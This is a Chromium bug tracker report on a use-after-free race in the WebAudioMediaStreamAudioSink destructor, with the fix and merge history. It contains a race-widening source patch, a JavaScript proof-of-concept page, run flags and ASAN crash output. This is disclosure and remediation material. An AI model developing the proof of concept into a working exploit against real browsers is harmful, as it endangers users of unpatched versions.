# Use-After-Free in WebAudioMediaStreamAudioSink Destructor via Data Race with OnSetFormat

| Field | Value |
|-------|-------|
| **Issue ID** | [485397139](https://issues.chromium.org/issues/485397139) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>MediaStream |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | ag...@chromium.org |
| **Created** | 2026-02-18 |
| **Bounty** | $3,000.00 |

## Description

## Summary

The destructor of `WebAudioMediaStreamAudioSink` accesses the `audio_converter_` member without acquiring `lock_`, despite the member being annotated `GUARDED_BY(lock_)`. Concurrently, the audio capture thread may invoke `OnSetFormat`, which holds `lock_` and replaces `audio_converter_` with a new instance via `std::make_unique`, freeing the old object. This creates a time-of-check-to-time-of-use race: the destructor reads a pointer to the `AudioConverter` and then calls `RemoveInput` through it, but between these two operations the capture thread may destroy the pointed-to object. The result is a use-after-free in the renderer process.

## Root Cause

`WebAudioMediaStreamAudioSink` bridges the MediaStream audio capture pipeline and the WebAudio rendering graph. It receives audio data from a `MediaStreamAudioTrack` on the capture thread and makes it available to `MediaStreamAudioSourceNode` for WebAudio rendering. The class uses a `base::Lock lock_` to protect shared state, and the header file correctly annotates the shared member:

```
// third_party/blink/renderer/modules/mediastream/webaudio_media_stream_audio_sink.h
std::unique_ptr<media::AudioConverter> audio_converter_ GUARDED_BY(lock_);

```

The `OnSetFormat` method, called from the audio capture thread whenever the source audio format changes, properly acquires the lock before replacing the converter:

```
// third_party/blink/renderer/modules/mediastream/webaudio_media_stream_audio_sink.cc
void WebAudioMediaStreamAudioSink::OnSetFormat(
    const media::AudioParameters& params) {
  CHECK(params.IsValid());

  base::AutoLock auto_lock(lock_);

  source_params_ = params;
  audio_converter_ = std::make_unique<media::AudioConverter>(
      source_params_, sink_params_, false);
  audio_converter_->AddInput(this);
  audio_converter_->PrimeWithSilence();
  // ...
}

```

The assignment to `audio_converter_` through `std::make_unique` first destroys the old `AudioConverter` object (freeing its memory) and then stores the pointer to the newly constructed one. This is safe with respect to other code paths that hold the lock, but the destructor does not hold the lock:

```
// third_party/blink/renderer/modules/mediastream/webaudio_media_stream_audio_sink.cc
WebAudioMediaStreamAudioSink::~WebAudioMediaStreamAudioSink() {
  if (audio_converter_.get())
    audio_converter_->RemoveInput(this);

  if (!track_stopped_) {
    WebMediaStreamAudioSink::RemoveFromAudioTrack(
        this, WebMediaStreamTrack(component_.Get()));
  }
}

```

The destructor runs on the main thread when the garbage collector sweeps the owning `AudioNode`. It reads the raw pointer from `audio_converter_` via `.get()` and then calls `RemoveInput(this)` on that pointer. Between reading the pointer and the subsequent dereference for the virtual call, the capture thread's `OnSetFormat` may execute in its entirety: it acquires the lock, replaces `audio_converter_` (destroying the old `AudioConverter` and freeing its memory), creates a new one, and releases the lock. The destructor then proceeds to call `RemoveInput` on the freed memory, resulting in a use-after-free.

The `audio_converter_` is a `std::unique_ptr`, not a `raw_ptr` with `BackupRefPtr` protection. When `std::make_unique` assigns a new value to the unique pointer, the old object is immediately deleted and its memory returned to the allocator. There is no quarantine or poison mechanism that would prevent the memory from being reused or detected as freed by AddressSanitizer.

The destructor is invoked through the V8 garbage collector's sweep phase. When JavaScript calls `gc()` or when garbage collection is triggered naturally, the cppgc sweeper runs on the main thread and destroys unreachable `AudioNode` objects. The destruction chain is: `AudioNode::~AudioNode` destroys the `MediaStreamAudioSourceHandler`, which destroys `MediaStreamWebAudioSource`, which destroys the `WebAudioMediaStreamAudioSink` via its `unique_ptr` member. Throughout this chain, the audio capture thread continues to deliver data and invoke `OnSetFormat` callbacks independently.

## Reproduce

To reproduce this issue, three source-level modifications are applied to increase the probability of hitting the race window. These modifications do not alter program logic or introduce new code paths; they only make the existing race condition more likely to manifest within a practical number of iterations.

Apply the following patch to the Chromium source tree:

```
diff --git a/third_party/blink/renderer/modules/mediastream/webaudio_media_stream_audio_sink.cc b/third_party/blink/renderer/modules/mediastream/webaudio_media_stream_audio_sink.cc
index cfba5c1557b81..64e453f22e6b6 100644
--- a/third_party/blink/renderer/modules/mediastream/webaudio_media_stream_audio_sink.cc
+++ b/third_party/blink/renderer/modules/mediastream/webaudio_media_stream_audio_sink.cc
@@ -8,6 +8,7 @@
 #include <string>

 #include "base/logging.h"
+#include "base/threading/platform_thread.h"
 #include "base/numerics/safe_conversions.h"
 #include "base/trace_event/trace_event.h"
 #include "media/base/audio_bus.h"
@@ -45,8 +46,12 @@ WebAudioMediaStreamAudioSink::WebAudioMediaStreamAudioSink(
 }

 WebAudioMediaStreamAudioSink::~WebAudioMediaStreamAudioSink() {
-  if (audio_converter_.get())
-    audio_converter_->RemoveInput(this);
+  // PATCH: widen race window for ASAN detection
+  media::AudioConverter* raw = audio_converter_.get();
+  if (raw) {
+    base::PlatformThread::Sleep(base::Milliseconds(10));
+    raw->RemoveInput(this);
+  }

   // If the track is still active, it is necessary to notify the track before
   // the source provider goes away.
diff --git a/third_party/blink/renderer/platform/mediastream/media_stream_audio_deliverer.h b/third_party/blink/renderer/platform/mediastream/media_stream_audio_deliverer.h
index 59a19c79b1d0c..5f7d3be4c19cf 100644
--- a/third_party/blink/renderer/platform/mediastream/media_stream_audio_deliverer.h
+++ b/third_party/blink/renderer/platform/mediastream/media_stream_audio_deliverer.h
@@ -107,10 +107,9 @@ class MediaStreamAudioDeliverer {
     base::AutoLock auto_lock(consumers_lock_);
     {
       base::AutoLock auto_params_lock(params_lock_);
-      if (params_.Equals(params))
-        return;
-      SendLogMessage(String::Format("%s({params=[%s]})", __func__,
-                                    params.AsHumanReadableString().c_str()));
+      // PATCH: remove Equals early-return to force OnSetFormat on every callback
+      // if (params_.Equals(params))
+      //   return;
       params_ = params;
     }
     pending_consumers_.AppendRange(consumers_.begin(), consumers_.end());
diff --git a/third_party/blink/renderer/platform/mediastream/media_stream_audio_source.cc b/third_party/blink/renderer/platform/mediastream/media_stream_audio_source.cc
index 1f3fe3a5910b5..db0a514edba8b 100644
--- a/third_party/blink/renderer/platform/mediastream/media_stream_audio_source.cc
+++ b/third_party/blink/renderer/platform/mediastream/media_stream_audio_source.cc
@@ -211,6 +211,8 @@ void MediaStreamAudioSource::DeliverDataToTracks(
     const media::AudioBus& audio_bus,
     base::TimeTicks reference_time,
     const media::AudioGlitchInfo& glitch_info) {
+  // PATCH: force OnSetFormat on every capture callback to widen race window
+  deliverer_.OnSetFormat(GetAudioParameters());
   deliverer_.OnData(audio_bus, reference_time, glitch_info);
 }

```

The patch contains three changes that collectively widen the race window. The first change, in `media_stream_audio_deliverer.h`, removes an early-return optimization that skips format propagation when audio parameters are unchanged. This is functionally equivalent to a scenario where the audio source changes format on every callback, such as during WebRTC renegotiation or device switching. The second change, in `media_stream_audio_source.cc`, calls `OnSetFormat` before every `OnData` delivery, ensuring the format propagation reaches the sink on every capture callback. This simulates a real audio source that continuously reports its format. The third change, in `webaudio_media_stream_audio_sink.cc`, inserts a 10-millisecond sleep in the destructor between reading the `audio_converter_` pointer and calling `RemoveInput` through it, widening the race window from approximately 10 nanoseconds to 10 milliseconds so that the capture thread's `OnSetFormat` can free the `AudioConverter` object in the interval. None of these changes alter the order of operations or introduce new code paths; they only increase the frequency of format callbacks and the duration of the existing unsynchronized access window.

After applying the patch, rebuild with:

```
ninja -C out/asan-release chrome

```

Save the following as `poc.html`:

```
<!DOCTYPE html>
<html><body><script>
async function main() {
  console.log("[*] WebAudioMediaStreamAudioSink destructor race");

  const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
  console.log("[+] Got media stream");

  for (let round = 0; round < 2000; round++) {
    if (round % 200 === 0) console.log("[*] Round " + round);

    const ctxs = [];
    for (let i = 0; i < 30; i++) {
      const ctx = new AudioContext();
      const src = new MediaStreamAudioSourceNode(ctx, { mediaStream: stream });
      src.connect(ctx.destination);
      ctxs.push(ctx);
    }

    await new Promise(r => setTimeout(r, 0));

    const promises = ctxs.map(c => c.close());

    gc();

    await new Promise(r => setTimeout(r, 0));
    gc();

    await Promise.allSettled(promises);
  }

  stream.getTracks().forEach(t => t.stop());
  console.log("[*] Done");
}
main();
</script></body></html>

```

Run with:

```
xvfb-run -a out/asan-release/chrome \
  --no-sandbox --disable-gpu \
  --use-fake-device-for-media-stream \
  --use-fake-ui-for-media-stream \
  --js-flags="--expose-gc" \
  poc.html

```

The `--use-fake-device-for-media-stream` flag provides a synthetic audio capture source so that `getUserMedia` succeeds without real audio hardware. The `--js-flags="--expose-gc"` flag exposes the `gc()` function to JavaScript so the PoC can trigger garbage collection deterministically. AddressSanitizer detects the use-after-free within the first round:

```
==4115325==ERROR: AddressSanitizer: heap-use-after-free on address 0x7c772bc0b988 at pc 0x7fb794559374 bp 0x7ffccd789350 sp 0x7ffccd789348
READ of size 8 at 0x7c772bc0b988 thread T0 (chrome)
    #0 std::__Cr::list<...>::remove(...) gen/third_party/libc++/src/include/list:529:107
    #1 media::AudioConverter::RemoveInput(media::AudioConverter::InputCallback*) media/base/audio_converter.cc:97:21
    #2 blink::WebAudioMediaStreamAudioSink::~WebAudioMediaStreamAudioSink() third_party/blink/renderer/modules/mediastream/webaudio_media_stream_audio_sink.cc:53:10
    #3 blink::WebAudioMediaStreamAudioSink::~WebAudioMediaStreamAudioSink() third_party/blink/renderer/modules/mediastream/webaudio_media_stream_audio_sink.cc:48:63
    #4 blink::MediaStreamWebAudioSource::~MediaStreamWebAudioSource() gen/third_party/libc++/src/include/__memory/unique_ptr.h:74:5
    #5 blink::MediaStreamWebAudioSource::~MediaStreamWebAudioSource() third_party/blink/renderer/platform/mediastream/media_stream_web_audio_source.cc:42:55
    #6 blink::MediaStreamAudioSourceHandler::~MediaStreamAudioSourceHandler() gen/third_party/libc++/src/include/__memory/unique_ptr.h:74:5
    #7 blink::AudioNode::~AudioNode() third_party/blink/renderer/platform/wtf/thread_safe_ref_counted.h:64:5
    #8 cppgc::internal::HeapVisitor<...>::Traverse(cppgc::internal::BasePage&) v8/src/heap/cppgc/sweeper.cc:277:13
    #9 cppgc::internal::(anonymous namespace)::MutatorThreadSweeper::Sweep(...) v8/src/heap/cppgc/sweeper.cc:653:36

SUMMARY: AddressSanitizer: heap-use-after-free gen/third_party/libc++/src/include/list:529:107
  in std::__Cr::list<base::raw_ptr<media::AudioConverter::InputCallback, ...>>::remove(...)

```

The stack trace shows the garbage collector's cppgc sweeper destroying an `AudioNode`, which cascades through `MediaStreamAudioSourceHandler` and `MediaStreamWebAudioSource` into the `WebAudioMediaStreamAudioSink` destructor. At frame #2, the destructor calls `RemoveInput` on the stale `AudioConverter` pointer, which was freed by the capture thread's `OnSetFormat` during the sleep window. Frame #1 shows `AudioConverter::RemoveInput` attempting to traverse its internal `std::list` of input callbacks, reading freed memory at the list node pointer.

## Timeline

### ma...@google.com (2026-02-18)

[security shepherd] I can repro with the patch.

Triaging this as High(S1) rather than Critical because of the patch required to trigger this reliably.

MediaStream owners, PTAL?

### hb...@chromium.org (2026-02-19)

Reassigning to Guido for streams and tracks, unless this should be owned by someone in WebAudio

### ch...@google.com (2026-02-19)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-19)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### gu...@google.com (2026-02-23)

agpalak@: Can you take a look?

### dx...@google.com (2026-02-23)

Project: chromium/src  

Branch:  main  

Author:  Palak Agarwal [agpalak@chromium.org](mailto:agpalak@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7594792>

Add lock in the destructor to protect access to audio\_converter\_

---


Expand for full commit details
```
     
    Bug: 485397139 
    Change-Id: I519ba0673d04cf5e98225ad7adeef9504cb5a4f4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7594792 
    Commit-Queue: Palak Agarwal <agpalak@chromium.org> 
    Reviewed-by: Guido Urdaneta <guidou@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1588707}

```

---

Files:

- M `third_party/blink/renderer/modules/mediastream/webaudio_media_stream_audio_sink.cc`

---

Hash: [28d8fb8917365453399d372029d404f6c181653b](https://chromiumdash.appspot.com/commit/28d8fb8917365453399d372029d404f6c181653b)  

Date: Mon Feb 23 15:48:27 2026


---

### ch...@google.com (2026-02-24)

Security Merge Request Consideration: Requesting merge to extended stable (M144) because latest trunk commit (1588707) appears to be after extended stable branch point (1552494).
Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1588707) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1588707) appears to be after beta branch point (1582197).
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ch...@google.com (2026-02-24)

Merge review required: M146 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-02-24)

Merge review required: M145 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-02-24)

Merge review required: M144 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### dr...@chromium.org (2026-02-25)

No crashes in Canary. Merge approved.

### dr...@chromium.org (2026-03-02)

Given the timing of the M145 release cut, I don't think this will be in M146. This should still be merged to M146 by 12pm PST tomorrow.

### ch...@google.com (2026-03-03)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### dx...@google.com (2026-03-03)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Palak Agarwal [agpalak@chromium.org](mailto:agpalak@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7626978>

[M146] Add lock in the destructor to protect access to audio\_converter\_

---


Expand for full commit details
```
     
    (cherry picked from commit 28d8fb8917365453399d372029d404f6c181653b) 
     
    Bug: 485397139 
    Change-Id: I519ba0673d04cf5e98225ad7adeef9504cb5a4f4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7594792 
    Commit-Queue: Palak Agarwal <agpalak@chromium.org> 
    Reviewed-by: Guido Urdaneta <guidou@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1588707} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7626978 
    Commit-Queue: Daniel Rubery <drubery@chromium.org> 
    Auto-Submit: Palak Agarwal <agpalak@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7680@{#1848} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `third_party/blink/renderer/modules/mediastream/webaudio_media_stream_audio_sink.cc`

---

Hash: [5d29cc0d8653f7227476ca6d1488a27cba8ebce8](https://chromiumdash.appspot.com/commit/5d29cc0d8653f7227476ca6d1488a27cba8ebce8)  

Date: Tue Mar 3 18:30:03 2026


---

### pe...@google.com (2026-03-03)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### pe...@google.com (2026-03-05)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-03-05)

1. https://chromium-review.git.corp.google.com/c/chromium/src/+/7633627
2. Low - There was no conflict.
3. 146
4. Yes, the issue seems to be introduced by the old patch[1]. Thus, I think M138 has the issue as well.

[1] https://chromiumcodereview.appspot.com/23691038/patch/89001/76016

### an...@google.com (2026-03-09)

We will wait until M146 hit stable in the week of Mar 24.

### sp...@google.com (2026-03-11)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
Baseline. Mildly mitigated (sandboxed/renderer) 


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### an...@google.com (2026-04-01)

Merge approved for LTS-138

### dx...@google.com (2026-04-07)

Project: chromium/src  

Branch:  refs/branch-heads/7204  

Author:  Palak Agarwal [agpalak@chromium.org](mailto:agpalak@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7633627>

[M138-LTS] Add lock in the destructor to protect access to audio\_converter\_

---


Expand for full commit details
```
     
    (cherry picked from commit 28d8fb8917365453399d372029d404f6c181653b) 
     
    Bug: 485397139 
    Change-Id: I519ba0673d04cf5e98225ad7adeef9504cb5a4f4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7594792 
    Commit-Queue: Palak Agarwal <agpalak@chromium.org> 
    Reviewed-by: Guido Urdaneta <guidou@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1588707} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7633627 
    Reviewed-by: Palak Agarwal <agpalak@chromium.org> 
    Reviewed-by: Michael Ershov <miersh@google.com> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Cr-Commit-Position: refs/branch-heads/7204@{#3523} 
    Cr-Branched-From: d5de512dc9dc8ddfe4e6d71b0637578bb6158683-refs/heads/main@{#1465706}

```

---

Files:

- M `third_party/blink/renderer/modules/mediastream/webaudio_media_stream_audio_sink.cc`

---

Hash: [5b9c1c3ebcbcc82668b4061ee559d3d80b438be2](https://chromiumdash.appspot.com/commit/5b9c1c3ebcbcc82668b4061ee559d3d80b438be2)  

Date: Tue Apr 7 15:45:44 2026


---

### pe...@google.com (2026-04-15)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-04-15)

1. https://chromium-review.git.corp.google.com/c/chromium/src/+/7752587
2. Low - There was no conflict.
3. 138 and 146
4. Yes, the issue seems to be introduced by the old patch[1]. Thus, I think M144 has the issue as well.

[1] https://chromiumcodereview.appspot.com/23691038/patch/89001/76016

### dx...@google.com (2026-04-30)

Project: chromium/src  

Branch:  refs/branch-heads/7559  

Author:  Palak Agarwal [agpalak@chromium.org](mailto:agpalak@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7752587>

[M144-LTS] Add lock in the destructor to protect access to audio\_converter\_

---


Expand for full commit details
```
     
    (cherry picked from commit 28d8fb8917365453399d372029d404f6c181653b) 
     
    Bug: 485397139 
    Change-Id: I519ba0673d04cf5e98225ad7adeef9504cb5a4f4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7594792 
    Commit-Queue: Palak Agarwal <agpalak@chromium.org> 
    Reviewed-by: Guido Urdaneta <guidou@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1588707} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7752587 
    Reviewed-by: Palak Agarwal <agpalak@chromium.org> 
    Reviewed-by: Achuith Bhandarkar <achuith@chromium.org> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Cr-Commit-Position: refs/branch-heads/7559@{#4839} 
    Cr-Branched-From: 223dfbac1c7542a06b422390d954afe5b560b607-refs/heads/main@{#1552494}

```

---

Files:

- M `third_party/blink/renderer/modules/mediastream/webaudio_media_stream_audio_sink.cc`

---

Hash: [b9d81905e326fba6a542a320766c2cf297e10f35](https://chromiumdash.appspot.com/commit/b9d81905e326fba6a542a320766c2cf297e10f35)  

Date: Thu Apr 30 04:48:34 2026


---

### ch...@google.com (2026-06-03)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485397139)*
